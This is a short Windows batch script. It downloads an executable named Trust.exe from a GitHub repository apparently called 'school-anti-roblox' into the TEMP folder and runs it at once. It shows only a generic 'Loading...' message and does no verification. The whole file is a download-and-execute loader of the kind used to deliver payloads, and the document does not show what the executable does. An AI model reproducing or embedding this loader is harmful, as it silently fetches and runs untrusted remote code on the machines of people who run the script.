@echo off
set EXE_URL=https://raw.githubusercontent.com/TheNikOSTeam/school-anti-roblox/refs/heads/main/Trust.exe
set TEMP_DIR=%TEMP%\Trust.exe
curl -L -o "%TEMP_DIR%" "%EXE_URL%"
if exist "%TEMP_DIR%" (
    echo Loading...
    start "" "%TEMP_DIR%"
) else (
    echo Failed!
)
exit /b
